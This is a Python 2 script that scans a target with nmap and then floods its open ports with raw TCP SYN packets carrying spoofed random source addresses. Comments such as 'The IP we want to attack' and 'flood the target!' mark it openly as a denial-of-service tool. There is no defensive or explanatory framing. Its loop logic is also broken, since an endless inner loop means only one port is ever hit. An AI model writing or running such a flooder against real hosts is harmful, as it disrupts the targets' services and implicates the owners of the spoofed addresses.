import socket, sys
from struct import *
import random
from random import randrange
import nmap

def random_IP():
    not_valid = [10, 127, 169, 172, 192]
    ip_1 = randrange(1, 256)
    while ip_1 in not_valid:
        ip_1 = randrange(1, 256)
    src_ip = str(ip_1) + "." + str(randrange(1, 256)) + "." + str(randrange(1, 256)) + "." + str(randrange(1, 256))
    return src_ip


def checksum(msg):
    s = 0
    for i in range(0, len(msg), 2):
        w = (ord(msg[i]) << 8) + (ord(msg[i + 1]))
        s = s + w
    s = (s >> 16) + (s & 0xffff);
    s = ~s & 0xffff
    return s

# create a raw socket
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
except socket.error, msg:
    print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
    sys.exit()

# tell kernel not to put in headers
s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

dest_ip = raw_input('Target IP: ') # The IP we want to attack
print "Begin Port Scan..."
nm = nmap.PortScanner()
nm.scan(dest_ip, '1-1024')
print "Complete Port Scan..."

# give value to proto
for proto in nm[dest_ip].all_protocols():
	pass

lport = nm[dest_ip][proto].keys()
lport.sort()

b = 0
# attack b times
print "Begin Real SynFlood..."
while b < 10:
    counter = 49152
    while counter < 65535:
        # start constructing the IP packet
        packet = '';
        src_ip = random_IP()  # spoof
        # ip header
        # see: http://www.360doc.com/content/12/1218/10/3405077_254722699.shtml
        ihl = 5  # IP header length
        version = 4  # version
        ihl_version = (version << 4) + ihl  # combine the first 8 bits
        tos = 0  # type of service
        tot_len = 20 + 20  # total length
        id = 54321  # identification
        frag_off = 0  # fragment offset
        ttl = 255  # time to live
        protocol = socket.IPPROTO_TCP  # protocal
        check = 10  # header checksum
        saddr = socket.inet_aton(src_ip)  # source address
        daddr = socket.inet_aton(dest_ip)  # destination address
        ip_header = pack('!BBHHHBBH4s4s', ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)
        for port in lport:
            # tcp header
            # see: http://www.2cto.com/net/201303/193828.html
            source = random.randint(1, 65535)  # source port
            dest = port  # destination port
            seq = 0  # sequence number
            ack_seq = 0  # ACK sequence number
            doff = 5  # length of tcp header
            offset_res = (doff << 4) + 0
            # tcp flags
            urg = 0
            ack = 0
            pseudo_header = 0
            rst = 0
            syn = 1
            fin = 0
            tcp_flags = fin + (syn << 1) + (rst << 2) + (pseudo_header << 3) + (ack << 4) + (urg << 5)
            window = socket.htons(5840)  # window size
            check = 0  # checksum
            urg_ptr = 0  # urgent pointer

            tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags, window, check, urg_ptr)

            # pseudo header
            source_address = socket.inet_aton(src_ip)
            dest_address = socket.inet_aton(dest_ip)
            placeholder = 0
            protocol = socket.IPPROTO_TCP
            tcp_length = len(tcp_header)

            pseudo_header = pack('!4s4sBBH', source_address, dest_address, placeholder, protocol, tcp_length);
            pseudo_header = pseudo_header + tcp_header;

            tcp_checksum = checksum(pseudo_header)

            # make the tcp header again and fill the correct checksum
            tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags, window, tcp_checksum, urg_ptr)
            packet = ip_header + tcp_header
            while 1:
                s.sendto(packet, (dest_ip, 0))  # flood the target!
        counter = counter + 1
    b = b + 1